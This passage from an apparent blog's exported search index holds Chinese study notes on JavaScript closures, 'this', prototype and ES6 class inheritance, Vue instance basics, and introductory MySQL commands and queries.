    <content type="text"><![CDATA[闭包 闭包：函数返回的值是一个函数，并且这个函数使用了父函数中的变量 注意到返回的函数在其定义内部引用了局部变量arr，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。 另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。我们来看一个例子： 12345678910111213141516171819202122function count() &#123; var arr = []; for (var i=1; i&lt;=3; i++) &#123; arr.push(function () &#123; return i * i; &#125;); &#125; return arr;&#125;var results = count();var f1 = results[0];var f2 = results[1];var f3 = results[2];在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都添加到一个Array中返回了。你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：f1(); // 16f2(); // 16f3(); // 16全部都是16！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变量i已经变成了4，因此最终结果为16。 返回闭包时牢记的一点就是：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变： 1234567891011121314151617181920212223242526function count() &#123; var arr = []; for (var i=1; i&lt;=3; i++) &#123; arr.push((function (n) &#123; return function () &#123; return n * n; &#125; &#125;)(i)); &#125; return arr;&#125;var results = count();var f1 = results[0];var f2 = results[1];var f3 = results[2];f1(); // 1f2(); // 4f3(); // 9//f1、f2、f3的值function () &#123; return function () &#123; return n * n; &#125;&#125; 注意这里用了一个“创建一个匿名函数并立刻执行”的语法： 123(function (x) &#123; return x * x;&#125;)(3); // 9 理论上讲，创建一个匿名函数并立刻执行可以这么写：1function (x) &#123; return x * x &#125; (3); 但是由于JavaScript语法解析的问题，会报SyntaxError错误，因此需要用括号把整个函数定义括起来：1(function (x) &#123; return x * x &#125;) (3); 通常，一个立即执行的匿名函数可以把函数体拆开，一般这么写：123(function (x) &#123; return x * x;&#125;)(3); 闭包实现私有变量 闭包有非常强大的功能。举个栗子：在面向对象的程序设计语言里，比如Java和C++，要在对象内部封装一个私有变量，可以用private修饰一个成员变量。 在没有class机制，只有函数的语言里，借助闭包，同样可以封装一个私有变量。我们用JavaScript创建一个计数器： 12345678910111213141516171819202122&apos;use strict&apos;;function create_counter(initial) &#123; var x = initial || 0; return &#123; inc: function () &#123; x += 1; return x; &#125; &#125;&#125;它用起来像这样：var c1 = create_counter();c1.inc(); // 1c1.inc(); // 2c1.inc(); // 3var c2 = create_counter(10);c2.inc(); // 11c2.inc(); // 12c2.inc(); // 13 在返回的对象中，实现了一个闭包，该闭包携带了局部变量 x，并且，从外部代码根本无法访问到变量 x。换句话说，闭包就是携带状态的函数，并且它的状态可以完全对外隐藏起来。 闭包还可以把多参数的函数变成单参数的函数。例如，要计算 xy 可以用 Math.pow(x, y) 函数，不过考虑到经常计算 x2 或 x3 ，我们可以利用闭包创建新的函数 pow2 和 pow3：123456789101112function make_pow(n) &#123; return function (x) &#123; return Math.pow(x, n); &#125;&#125;// 创建两个新函数:var pow2 = make_pow(2);var pow3 = make_pow(3);pow2(5); // 25pow3(7); // 343]]></content>
      <categories>
        <category>闭包</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js-this]]></title>
    <url>%2F2017%2F07%2F01%2Fjs%2FJS-this%2F</url>
    <content type="text"><![CDATA[this 在一个独立的函数调用中，根据是否是strict模式，this指向undefined或window对象的方法中的this指向对象，但是方法中的函数this指向的是window或undefinedthis 指向函数外层，外层如果是对象，则指向此对象，如果不是则指向 undefined 或 window 在一个方法内部，this 是一个特殊变量，它始终指向当前对象，也就是 xiaoming 这个变量。所以，this.birth 可以拿到xiaoming的birth属性。 123456789101112131415让我们拆开写：function getAge() &#123; var y = new Date().getFullYear(); return y - this.birth;&#125;var xiaoming = &#123; name: '小明', birth: 1990, age: getAge&#125;;xiaoming.age(); // 25, 正常结果getAge(); // NaN 如果以对象的方法形式调用，比如 xiaoming.age() ，该函数的 this 指向被调用的对象，也就是 xiaoming，如果单独调用函数，比如 getAge() ，此时，该函数的 this 指向全局对象，也就是 window。 更坑爹的是，如果这么写：12var fn = xiaoming.age; // 先拿到xiaoming的age函数fn(); // NaN 也是不行的！要保证 this 指向正确，必须用 obj.xxx() 的形式调用！ 由于这是一个巨大的设计错误，要想纠正可没那么简单。ECMA决定，在 strict模式 下让函数的 this 指向 undefined，因此，在strict模式下，你会得到一个错误：12345678910111213'use strict';var xiaoming = &#123; name: '小明', birth: 1990, age: function () &#123; var y = new Date().getFullYear(); return y - this.birth; &#125;&#125;;var fn = xiaoming.age;fn(); // Uncaught TypeError: Cannot read property 'birth' of undefined 这个决定只是让错误及时暴露出来，并没有解决this应该指向的正确位置。 有些时候，喜欢重构的你把方法重构了一下：123456789101112131415'use strict';var xiaoming = &#123; name: '小明', birth: 1990, age: function () &#123; function getAgeFromBirth() &#123; var y = new Date().getFullYear(); return y - this.birth; &#125; return getAgeFromBirth(); &#125;&#125;;xiaoming.age(); // Uncaught TypeError: Cannot read property 'birth' of undefined 结果又报错了！原因是this指针只在age方法的函数内指向xiaoming，在函数内部定义的函数，this又指向undefined了！（在非strict模式下，它重新指向全局对象window！） 修复的办法也不是没有，我们用一个that变量首先捕获this：12345678910111213141516'use strict';var xiaoming = &#123; name: '小明', birth: 1990, age: function () &#123; var that = this; // 在方法内部一开始就捕获this function getAgeFromBirth() &#123; var y = new Date().getFullYear(); return y - that.birth; // 用that而不是this &#125; return getAgeFromBirth(); &#125;&#125;;xiaoming.age(); // 25 用 var that = this; ，你就可以放心地在方法内部定义其他函数，而不是把所有语句都堆到一个方法中。]]></content>
      <categories>
        <category>this</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>this</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js-面向对象]]></title>
    <url>%2F2017%2F07%2F01%2Fjs%2FJS-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[对象操作 访问属性是通过 . 操作符完成的，但这要求属性名必须是一个有效的变量名。如果属性名包含特殊字符，就必须用 &#39;&#39; 括起来： 1234var xiaohong = &#123; name: '小红', 'middle-school': 'No.1 Middle School'&#125;; xiaohong 的属性名 middle-school 不是一个有效的变量，就需要用 &#39;&#39; 括起来。访问这个属性也无法使用.操作符，必须用 [&#39;xxx&#39;] 来访问： 123xiaohong['middle-school']; // 'No.1 Middle School'xiaohong['name']; // '小红'xiaohong.name; // '小红' 删除属性1delete xiaohong.name; // 删除name属性 如果我们要检测 xiaoming 是否拥有某一属性，可以用 in 操作符： 12345678910var xiaoming = &#123; name: '小明', birth: 1990, school: 'No.1 Middle School', height: 1.70, weight: 65, score: null&#125;;'name' in xiaoming; // true'grade' in xiaoming; // false 不过要小心，如果 in 判断一个属性存在，这个属性 不一定 是xiaoming的，它可能是xiaoming继承得到的： 1'toString' in xiaoming; // true 因为 toString 定义在 object 对象中，而所有对象最终都会在 原型链 上指向 object，所以xiaoming也拥有 toString 属性。 要判断一个属性是否是xiaoming自身拥有的，而不是继承得到的，可以用 hasOwnProperty() 方法： 12345var xiaoming = &#123; name: '小明'&#125;;xiaoming.hasOwnProperty('name'); // truexiaoming.hasOwnProperty('toString'); // false 面向对象编程面向对象编程 JavaScript的面向对象编程和大多数其他语言如Java、C#的面向对象编程都不太一样。在JavaScript中，这个概念需要改一改。 JavaScript不区分类和实例的概念，而是通过原型（prototype）来实现面向对象编程。 原型是指当我们想要创建xiaoming这个具体的学生时，我们并没有一个Student类型可用。那怎么办？恰好有这么一个现成的对象： 1234567var robot = &#123; name: 'Robot', height: 1.6, run: function () &#123; console.log(this.name + ' is running...'); &#125;&#125;; 我们看这个robot对象有名字，有身高，还会跑，有点像小明，干脆就根据它来“创建”小明得了！于是我们把它改名为Student，然后创建出xiaoming： 12345678910111213var Student = &#123; name: 'Robot', height: 1.2, run: function () &#123; console.log(this.name + ' is running...'); &#125;&#125;;var xiaoming = &#123; name: '小明'&#125;;xiaoming.__proto__ = Student; 注意最后一行代码把xiaoming的原型指向了对象Student，看上去xiaoming仿佛是从Student继承下来的： 123xiaoming.name; // '小明'xiaoming.run(); // 小明 is running...xiaoming有自己的name属性，但并没有定义run()方法。不过，由于小明是从Student继承而来，只要Student有run()方法，xiaoming也可以调用： JavaScript的原型链和Java的Class区别就在，它没有“Class”的概念，所有对象都是实例，所谓继承关系不过是把一个对象的原型指向另一个对象而已。 如果你把 xiaoming 的原型指向其他对象： 1234567891011var Bird = &#123; fly: function () &#123; console.log(this.name + ' is flying...'); &#125;&#125;;xiaoming.__proto__ = Bird;现在xiaoming已经无法run()了，他已经变成了一只鸟：xiaoming.fly(); // 小明 is flying...在JavaScrip代码运行时期，你可以把xiaoming从Student变成Bird，或者变成任何对象。 请注意，上述代码仅用于演示目的。在编写JavaScript代码时，不要直接用obj.proto去改变一个对象的原型，并且，低版本的IE也无法使用proto。 创建对象Object.create()创建 Object.create() 方法可以传入一个 原型对象 ，并创建一个基于该原型的新对象，但是新对象什么属性都没有，因此，我们可以编写一个函数来创建 xiaoming： 1234567891011121314151617181920// 原型对象:var Student = &#123; name: 'Robot', height: 1.2, run: function () &#123; console.log(this.name + ' is running...'); &#125;&#125;;function createStudent(name) &#123; // 基于Student原型创建一个新对象: var s = Object.create(Student); // 初始化新对象: s.name = name; return s;&#125;var xiaoming = createStudent('小明');xiaoming.run(); // 小明 is running...xiaoming.__proto__ === Student; // true new 创建 理解：将定义的构造函数比作成class，创建这个构造函数的时候会同时创建一个与之对象，暂且叫做源对象(原型)，通过构造函数创建的对象的原型就是这个源对象，而构造函数中会有一个 .prototype 属性指向这个源对象(原型), 源对象(原型)也会有一个 constructor 指向构造函数。创建的对象又有 __proto__ 指向这个源对象(原型) JavaScript对每个创建的对象都会设置一个原型，指向它的原型对象。 当我们用obj.xxx访问一个对象的属性时，JavaScript引擎先在当前对象上查找该属性，如果没有找到，就到其原型对象上找，如果还没有找到，就一直上溯到Object.prototype对象，最后，如果还没有找到，就只能返回undefined。 例如，创建一个Array对象： 123456789101112131415var arr = [1, 2, 3];其原型链是：arr ----&gt; Array.prototype ----&gt; Object.prototype ----&gt; nullArray.prototype定义了indexOf()、shift()等方法，因此你可以在所有的Array对象上直接调用这些方法。当我们创建一个函数时：function foo() &#123; return 0;&#125;函数也是一个对象，它的原型链是：foo ----&gt; Function.prototype ----&gt; Object.prototype ----&gt; null由于Function.prototype定义了apply()等方法，因此，所有函数都可以调用apply()方法。 很容易想到，如果原型链很长，那么访问一个对象的属性就会因为花更多的时间查找而变得更慢，因此要注意不要把原型链搞得太长。 构造函数 除了直接用{ … }创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数： 123456function Student(name) &#123; this.name = name; this.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;); &#125;&#125; 这确实是一个普通函数，但是在JavaScript中，可以用关键字new来调用这个函数，并返回一个对象： 123var xiaoming = new Student(&apos;小明&apos;);xiaoming.name; // &apos;小明&apos;xiaoming.hello(); // Hello, 小明! 注意，如果不写new，这就是一个普通函数，它返回undefined。但是，如果写了new，它就变成了一个构造函数，它绑定的this指向新创建的对象，并默认返回this，也就是说，不需要在最后写return this;。 新创建的xiaoming的原型链是： xiaoming —-&gt; Student.prototype —-&gt; Object.prototype —-&gt; null也就是说，xiaoming的原型指向函数Student的原型。如果你又创建了xiaohong、xiaojun，那么这些对象的原型与xiaoming是一样的：123xiaoming ↘xiaohong -→ Student.prototype ----&gt; Object.prototype ----&gt; nullxiaojun ↗ 用new Student()创建的对象还从原型上获得了一个constructor属性，它指向函数Student本身： 123456xiaoming.constructor === Student.prototype.constructor; // trueStudent.prototype.constructor === Student; // trueObject.getPrototypeOf(xiaoming) === Student.prototype; // truexiaoming instanceof Student; // true 看晕了吧？用一张图来表示这些乱七八糟的关系就是： 红色箭头是原型链。注意，Student.prototype指向的对象就是xiaoming、xiaohong的原型对象，这个原型对象自己还有个属性constructor，指向Student函数本身。 另外，函数Student恰好有个属性prototype指向xiaoming、xiaohong的原型对象，但是xiaoming、xiaohong这些对象可没有prototype这个属性，不过可以用proto这个非标准用法来查看。 现在我们就认为xiaoming、xiaohong这些对象“继承”自Student。 12345678不过还有一个小问题，注意观察：xiaoming.name; // &apos;小明&apos;xiaohong.name; // &apos;小红&apos;xiaoming.hello; // function: Student.hello()xiaohong.hello; // function: Student.hello()xiaoming.hello === xiaohong.hello; // falsexiaoming和xiaohong各自的name不同，这是对的，否则我们无法区分谁是谁了。 xiaoming和xiaohong各自的hello是一个函数，但它们是两个不同的函数，虽然函数名称和代码都是相同的！ 如果我们通过new Student()创建了很多对象，这些对象的hello函数实际上只需要共享同一个函数就可以了，这样可以节省很多内存。 要让创建的对象共享一个hello函数，根据对象的属性查找原则，我们只要把hello函数移动到xiaoming、xiaohong这些对象共同的原型上就可以了，也就是Student.prototype： 12345678910修改代码如下：function Student(name) &#123; this.name = name;&#125;Student.prototype.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;);&#125;;用new创建基于原型的JavaScript的对象就是这么简单！ 忘记写new怎么办 如果一个函数被定义为用于创建对象的构造函数，但是调用时忘记了写new怎么办？ 在strict模式下，this.name = name将报错，因为this绑定为undefined，在非strict模式下，this.name = name不报错，因为this绑定为window，于是无意间创建了全局变量name，并且返回undefined，这个结果更糟糕。 所以，调用构造函数千万不要忘记写new。为了区分普通函数和构造函数，按照约定，构造函数首字母应当大写，而普通函数首字母应当小写，这样，一些语法检查工具如jslint将可以帮你检测到漏写的new。 最后，我们还可以编写一个createStudent()函数，在内部封装所有的new操作。一个常用的编程模式像这样： 12345678910111213141516171819function Student(props) &#123; this.name = props.name || &apos;匿名&apos;; // 默认值为&apos;匿名&apos; this.grade = props.grade || 1; // 默认值为1&#125;Student.prototype.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;);&#125;;function createStudent(props) &#123; return new Student(props || &#123;&#125;)&#125;这个createStudent()函数有几个巨大的优点：一是不需要new来调用，二是参数非常灵活，可以不传，也可以这么传：var xiaoming = createStudent(&#123; name: &apos;小明&apos;&#125;);xiaoming.grade; // 1 如果创建的对象有很多属性，我们只需要传递需要的某些属性，剩下的属性可以用默认值。由于参数是一个Object，我们无需记忆参数的顺序。如果恰好从JSON拿到了一个对象，就可以直接创建出xiaoming。 原型继承 JavaScript由于采用原型继承，我们无法直接扩展一个Class，因为根本不存在Class这种类型。 但是办法还是有的。我们先回顾Student构造函数： 1234567function Student(props) &#123; this.name = props.name || &apos;Unnamed&apos;;&#125;Student.prototype.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;);&#125; 以及Student的原型链： 现在，我们要基于Student扩展出PrimaryStudent，可以先定义出PrimaryStudent： 12345function PrimaryStudent(props) &#123; // 调用Student构造函数，绑定this变量: Student.call(this, props); this.grade = props.grade || 1;&#125; 但是，调用了Student构造函数不等于继承了Student，PrimaryStudent创建的对象的原型是： 1new PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; Object.prototype ----&gt; null 必须想办法把原型链修改为： 1new PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; Student.prototype ----&gt; Object.prototype ----&gt; null 这样，原型链对了，继承关系就对了。新的基于PrimaryStudent创建的对象不但能调用PrimaryStudent.prototype定义的方法，也可以调用Student.prototype定义的方法。 如果你想用最简单粗暴的方法这么干： 1PrimaryStudent.prototype = Student.prototype; 是不行的！如果这样的话，PrimaryStudent和Student共享一个原型对象，那还要定义PrimaryStudent干啥？ 我们必须借助一个中间对象来实现正确的原型链，这个中间对象的原型要指向Student.prototype。为了实现这一点，参考道爷（就是发明JSON的那个道格拉斯）的代码，中间对象可以用一个空函数F来实现： 123456789101112131415161718192021222324252627282930313233343536373839// PrimaryStudent构造函数:function PrimaryStudent(props) &#123; Student.call(this, props); this.grade = props.grade || 1;&#125;// 空函数F:function F() &#123;&#125;// 把F的原型指向Student.prototype:F.prototype = Student.prototype;// 把PrimaryStudent的原型指向一个新的F对象，F对象的原型正好指向Student.prototype:PrimaryStudent.prototype = new F();// 把PrimaryStudent原型的构造函数修复为PrimaryStudent:PrimaryStudent.prototype.constructor = PrimaryStudent;// 继续在PrimaryStudent原型（就是new F()对象）上定义方法：PrimaryStudent.prototype.getGrade = function () &#123; return this.grade;&#125;;// 创建xiaoming:var xiaoming = new PrimaryStudent(&#123; name: &apos;小明&apos;, grade: 2&#125;);xiaoming.name; // &apos;小明&apos;xiaoming.grade; // 2// 验证原型:xiaoming.__proto__ === PrimaryStudent.prototype; // truexiaoming.__proto__.__proto__ === Student.prototype; // true// 验证继承关系:xiaoming instanceof PrimaryStudent; // truexiaoming instanceof Student; // true 用一张图来表示新的原型链： 注意，函数F仅用于桥接，我们仅创建了一个new F()实例，而且，没有改变原有的Student定义的原型链。 每个创建的对象，都会有一个 __proto__ 属性来指向上级原型对象，上图其实应该是有new F() 指向 F -prototype 的 如果把继承这个动作用一个inherits()函数封装起来，还可以隐藏F的定义，并简化代码： 12345678910111213141516171819202122232425262728function inherits(Child, Parent) &#123; var F = function () &#123;&#125;; F.prototype = Parent.prototype; Child.prototype = new F(); Child.prototype.constructor = Child;&#125;这个inherits()函数可以复用：function Student(props) &#123; this.name = props.name || &apos;Unnamed&apos;;&#125;Student.prototype.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;);&#125;function PrimaryStudent(props) &#123; Student.call(this, props); this.grade = props.grade || 1;&#125;// 实现原型继承链:inherits(PrimaryStudent, Student);// 绑定其他方法到PrimaryStudent原型:PrimaryStudent.prototype.getGrade = function () &#123; return this.grade;&#125;; 小结 JavaScript的原型继承实现方式就是： 定义新的构造函数，并在内部用call()调用希望“继承”的构造函数，并绑定this； 借助中间函数F实现原型链继承，最好通过封装的inherits函数完成； 继续在新的构造函数的原型上定义新方法。 class继承 在上面的章节中我们看到了JavaScript的对象模型是基于原型实现的，特点是简单，缺点是理解起来比传统的类－实例模型要困难，最大的缺点是继承的实现需要编写大量代码，并且需要正确实现原型链。 有没有更简单的写法？有！ 新的关键字class从ES6开始正式被引入到JavaScript中。class的目的就是让定义类更简单。 我们先回顾用函数实现Student的方法： 1234567function Student(name) &#123; this.name = name;&#125;Student.prototype.hello = function () &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;);&#125; 如果用新的class关键字来编写Student，可以这样写： 123456789class Student &#123; constructor(name) &#123; this.name = name; &#125; hello() &#123; alert(&apos;Hello, &apos; + this.name + &apos;!&apos;); &#125;&#125; 比较一下就可以发现，class的定义包含了构造函数constructor和定义在原型对象上的函数hello()（注意没有function关键字），这样就避免了Student.prototype.hello = function () {…}这样分散的代码。 最后，创建一个Student对象代码和前面章节完全一样： 12var xiaoming = new Student(&apos;小明&apos;);xiaoming.hello(); class继承 用class定义对象的另一个巨大的好处是继承更方便了。想一想我们从Student派生一个PrimaryStudent需要编写的代码量。现在，原型继承的中间对象，原型对象的构造函数等等都不需要考虑了，直接通过extends来实现： 12345678910class PrimaryStudent extends Student &#123; constructor(name, grade) &#123; super(name); // 记得用super调用父类的构造方法! this.grade = grade; &#125; myGrade() &#123; alert(&apos;I am at grade &apos; + this.grade); &#125;&#125; 注意PrimaryStudent的定义也是class关键字实现的，而extends则表示原型链对象来自Student。子类的构造函数可能会与父类不太相同，例如，PrimaryStudent需要name和grade两个参数，并且需要通过super(name)来调用父类的构造函数，否则父类的name属性无法正常初始化。 PrimaryStudent已经自动获得了父类Student的hello方法，我们又在子类中定义了新的myGrade方法。 ES6引入的class和原有的JavaScript原型继承有什么区别呢？实际上它们没有任何区别，class的作用就是让JavaScript引擎去实现原来需要我们自己编写的原型链代码。简而言之，用class的好处就是极大地简化了原型链代码。 你一定会问，class这么好用，能不能现在就用上？ 现在用还早了点，因为不是所有的主流浏览器都支持ES6的class。如果一定要现在就用上，就需要一个工具把class代码转换为传统的prototype代码，可以试试 Babel 这个工具。]]></content>
      <categories>
        <category>js面向对象</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue 学习]]></title>
    <url>%2F2017%2F07%2F01%2Fvue%2FVue.js-begin%2F</url>
    <content type="text"><![CDATA[vue中 数据和DOM 是绑定的，动态响应的，数据改变，对应的DOM也会发生改变 属性与方法每个 Vue 实例都会代理其 data 对象里所有的属性：1234567891011var data = &#123; a: 1 &#125;var vm = new Vue(&#123; data: data&#125;)vm.a === data.a // -&gt; true// 设置属性也会影响到原始数据vm.a = 2data.a // -&gt; 2// ... 反之亦然data.a = 3vm.a // -&gt; 3 注意只有这些被代理的属性是响应的，也就是说值的任何改变都是触发视图的重新渲染。如果在实例创建之后添加新的属性到实例上，它不会触发视图更新。除了 data 属性， Vue 实例暴露了一些有用的 实例属性与方法 。这些属性与方法都有 前缀 $，以便与代理的 data 属性区分。例如：1234567891011var data = &#123; a: 1 &#125;var vm = new Vue(&#123; el: '#example', data: data&#125;)vm.$data === data // -&gt; truevm.$el === document.getElementById('example') // -&gt; true// $watch 是一个实例方法vm.$watch('a', function (newVal, oldVal) &#123; // 这个回调将在 `vm.a` 改变后调用&#125;) 注意，不要在实例属性或者回调函数中（如 vm.$watch(&#39;a&#39;, newVal =&gt; this.myMethod())）使用箭头函数。因为箭头函数绑定父级上下文，所以 this 不会像预想的一样是 Vue 实例，而是 this.myMethod 未被定义。 声明周期每个 Vue 实例在被创建之前都要经过一系列的初始化过程。例如，实例需要配置数据观测(data observer)、编译模版、挂载实例到 DOM ，然后在数据变化时更新 DOM 。在这个过程中，实例也会调用一些 生命周期钩子 ，这就给我们提供了执行自定义逻辑的机会。例如，created 这个钩子在实例被创建之后被调用：12345678910var vm = new Vue(&#123; data: &#123; a: 1 &#125;, created: function () &#123; // `this` 指向 vm 实例 console.log('a is: ' + this.a) &#125;&#125;)// -&gt; "a is: 1" 也有一些其它的钩子，在实例生命周期的不同阶段调用，如 mounted、updated、destroyed。钩子的 this 指向调用它的 Vue 实例。声明周期图 模版语法]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql基础操作]]></title>
    <url>%2F2017%2F07%2F01%2Fmysql%2Fmysql%2F</url>
    <content type="text"><![CDATA[终端使用安装数据库brew 安装 启动 连接数据库12345678910mysql -uroot -p``` **数据库存放位置** `/usr/local/var/mysql/`&gt; 可以通过 `find / -name *.frm` 查找 **创建数据库** ```sqlcreate database 数据库名 [charset 字符编码名] [collate 排序规则名]; 查看mysql中的所有字符编码名(字符集) 1show charset; 查看所有的排序规则名 1show collation; 创建数据库1CREATE DATABASE test CHARSET utf8; 修改数据库1alter database 数据库名 [charset 字符编码名] [collate 排序规则名]; 数据文件 test 数据库文件夹db.opt 数据库文件myisam_1.frm 表结构文件myisam_1.MYD 数据文件myisam_1.MYI 索引文件 退出quit 或者 exit备份数据库 mysqldump -h要备份的数据库所在的服务器 -u用户名 -p 数据库名 &gt; 完整目标文件名不需要进入mysql服务执行 1mysqldump -hlocalhost -uroot -p test &gt; /Users/echo-ding/Documents/ding/test.sql 恢复数据库1234567先把原来的删除 drop database test;#删除数据库show databases;#显示所有的数据库CREATE DATABASE test CHARSET utf8;还原 注意：先要创建还原的数据库testmysql -hlocalhost -uroot -p test &lt; /Users/echo-ding/Documents/ding/test.sql 命名规则 本身并不区分大小写，但是由于在unix、linux上的文件名区分大小写，所以数据库名字和表名、视图是区分大小写的对于可能用到系统关键词的 使用反撇号 ` 包裹 删除数据库 drop database 数据库名 查看所有数据库 show databases; 选择数据库 use 数据库名称; 表的一般操作查看当前数据库下的表1show tables; 删除表1drop 表名； 查看表结构1desc 表名; 查看表的创建语句1show create table 表名; 复制表结构1create table [if not exists] 新表名 like 原表名; 清空一张表1truncate 表名; 相当于删除一张表重新创建 添加列1alter table 表名 add 字段 类型; 更改表名1alter table oldtablename to newtablename; 创建表123456789create table [if not exists] 表名(键名 类型 , ……)``` 创建指定编码格式的表 ```sqlcreate table 表名(键名 类型 , ……) charset utf8;``` 例子： ```sqlcreate table msg(id int primary key auto_increment,title varchar(60)) charset utf8; 123456USE test; #选用数据库CREATE TABLE myisam_1 ( id INT UNSIGNED NOT NULL AUTO_INCREMENT, title VARCHAR(8) NOT NULL DEFAULT '', PRIMARY KEY (id)) ENGINE = MYISAM CHARSET=utf8;#myisam引擎的 字段属性 索引 primary key (fields1[,fields2,……]) :设定主键，每个表需要(必须,只能)有一个,字段值不能重复。可以多个字段共同组成一个主键。unique key (fields1[,fields2,……]) ：用于设定该字段的值，在这个表中，不可以重复（即是唯一的）key (fields1[,fields2,……]) : 普通索引，仅仅是建立了索引fulltext key (fields1[,fields2,……]) ：全文索引，目前对中文支持不好foreign (fields1[,fields2,……]) references 其他表(fields1[,fields2,……]) : 设定外键，附加外键索引和外键约束 外键：构建两个表之间的联系，表1中的外键和另表2的主键(只要是不重复的应该都可以)对应，这样通过表1的外键就可以在表2，查出对应的数据。表1的外键和表2的主键字段的类型必须一致。 一张表可以有多个外键指向不同的表 创建索引可以加快查找的速度，但是添加的速度会变慢，但一般程序查的功能较多 . 其它 auto_increment ：用于设定一个字段值(整型的)的自动增长(自增)，而且，它设定后还必须同时设定在一个字段为一个“key”(比如:priamry key 或 unique key)not null： 用于设定一个字段的值不能为空值（null）——如果不设定，则就是可为空值；非空约束null是一种类型,比较时,只能用专门的is null 和 is not null来比较.碰到运算符,一律返回null,效率不高,影响提高索引效果 default XX值：用于设定某个字段的值，在插入数据的时候如果没有给值，就使用该默认值；comment ‘说明文字’：就是一个说明字段含义的文字，备注 修改表的字段／属性／索引1234567891011121314151617181920212223242526272829//添加字段(添加列)：alter table 表名 add 新字段名 字段类型 [附加属性];//删除字段(删除列):alter table 表名 drop 字段名;//修改字段:alter table 表名 change 旧字段名 新字段名 新字段属性;//修改表名:alter table 表名 rename 新表名;#操作索引//添加普通索引alter table xiugai_test add key (realname);//添加唯一索引alter table xiugai_test add unique key(realname);//添加主键索引alter table xiugai_test add primary key(id);//添加外键索引alter table xiugai_test add foreign key(xuehao) references students(id);//添加字段默认值alter table xiugai_test alter realname set default 0;//删除字段默认值alter table xiugai_test alter realname drop default;//删除主键alter table xiugai_test drop primary key; 如果要删除主键，需要先删除自动增长 alter table xiugai_test modify column id int unsigned not null;//删除外键alter table xiugai_test drop foreign key xuehao;//删除索引alter table xiugai_test drop key realname; 查12基本查询语句select 字段 from 表名 where 条件; ###where字句###算数运算符12+ - * / %例子：select * from 表名 where 字段名 + 100 &lt; 200;//筛选出相应列加上100依旧小于200的数据 //最好不要字段参与运算，不利于索引 比较运算符1234&gt; &gt;= &lt; &lt;= =(等于) &lt;&gt;或!=(不等于) 最常用比较运算符可以在字段中使用，返回的值是0(不满足时)或1(满足时)例如 SELECT goods_name ,cat_id&lt;8 FROM goods; //cat_id&lt;8列显示的是0或1这样方便在用sum等函数统计，如sum(cat_id&lt;8) 逻辑运算符12and(与) or(或) not(非) 例子：select * from 表 where id&lt;6 and c5&gt;1; is运算符12345只能对特殊的几个数据进行判断xx字段 is truexx字段 is falsexx字段 is nullxx字段 is not null between运算符123用法： 字段x between 值1 and 值2;值1 和 值2 范围之内的都符合条件例如： where id between 3 and 6; //id在3和6之间都符合要求 in运算符12用法： 字段x in (值1,值2,……) // not in() 相反 只要字段x的值满足括号中给定的任意的数值就算满足条件 like运算符——模糊查找123456用法：字段x like '要查找的字符'要查找的字符需要配合 % _ 才能完成模糊查询% 匹配任意长度的任意字符_ 匹配一个长度的任意字符如果要特意的匹配数据中包含 % 或 _ 的数据，需要进行转义例如：9_\% 表示匹配 9x% (x为任意字符) group by 字句 —分组 group by 根据 select 查询语句查询出的结果进行分组 用法1group by 字段名 [asc|desc]，字段名 [asc|desc] , …… 1，group by子句是用于将“前面”取得的数据，按某种标准（依据）——也就是字段——来进行分组的。分组，基本上就是，按给定字段的值，相同的值，分在相同的组中，不同的值分在不同的组中。2，asc表示分组后，按组的值的大小正序排列，desc是倒序——默认是正序，可以不写。3，一个最重要的理解（观念）：分组之后的结果，也是一行一行数据，只是每一行代表“一组” 特别注意：分组之后，结果行中的数据，都只能出现“组信息”——描述该组的“应有信息”。具体来说，对于分组查询的结果数据（select子句部分），只能出现如下几类数据：1， 分组依据本身——即该字段；2， 原始字段信息中的数字类型的最大值，最小值，平均值，总和值；max(字段)：获得该字段的在组中的最大值；min(字段)：获得该字段的在组中的最小值；avg(字段)：获得该字段的在组中的平均值；sum(字段)：获得该字段的在组中的总和值；3， 每一组中所包含的原始数据行的行数，获得方式为：count(*) 123例子：select 字段1,max(字段2) as 最大值,min(字段3) as 最小值,avg(字段4)as 平均值,sum(字段5)as 总和,count(*)as 总条数, from 表名 group by 字段1;as 用来给查询出的字段设置别名，用来表头的显示，也可以在条件部分使用别名代替原字段按照 字段1 进行分组，分别显示分组后对应字段的一组所有数据的最小值，最大值等等 如果没有使用聚合函数直接使用字段，默认显示该字段的第一个值 having字句 having条件语句和where条件语句的区别，使用的目标不一样，where是对原始数据(表数据)进行的筛选行为，而having是对group by分组后形成的数据进行的筛选(可以把group by分组后的结果当成一张表)，having能用的筛选条件只能是select子句中出现的字段 用法：1having 条件判断 例子：123select pinpai ，max(price) as 最高价 , min(price) as 最低价 , avg(price) as 平均价, sum(price) as 价格总和, count(*) as 数量 from 'product' group by pinpai having count(*) &gt; 2;或条件用as别名：select pinpai ，max(price) as 最高价 , min(price) as 最低价 , avg(price) as 平均价, sum(price) as 价格总和, count(*) as 数量 from 'product' 